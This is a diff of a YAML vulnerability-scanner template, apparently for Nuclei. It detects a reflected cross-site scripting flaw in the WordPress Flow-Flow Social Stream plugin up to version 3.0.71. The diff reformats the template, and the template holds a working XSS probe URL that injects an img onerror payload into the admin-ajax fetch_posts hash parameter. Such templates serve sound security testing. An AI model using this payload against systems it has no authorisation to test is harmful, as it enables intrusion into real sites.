@@ -1,5 +1,4 @@
 id: flow-flow-social-stream-xss
-
 info:
   name: WordPress Flow-Flow Social Stream <=3.0.71 - Cross-Site Scripting
   author: alph4byt3
@@ -10,31 +9,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 5.4
-    cwe-id: CWE-80
+    cwe-id: CWE-79,CWE-80,CWE-83
   metadata:
     max-request: 1
-  tags: xss,wordpress,wpscan,vuln
-
+  tags: vuln,wordpress,wpscan,xss
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
           - '"hash":"<img src=x onerror=alert(document.domain)>"'
           - '"errors"'
-        condition: and
-
-      - type: word
-        part: header
+      - part: header
+        type: word
         words:
-          - 'text/html'
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
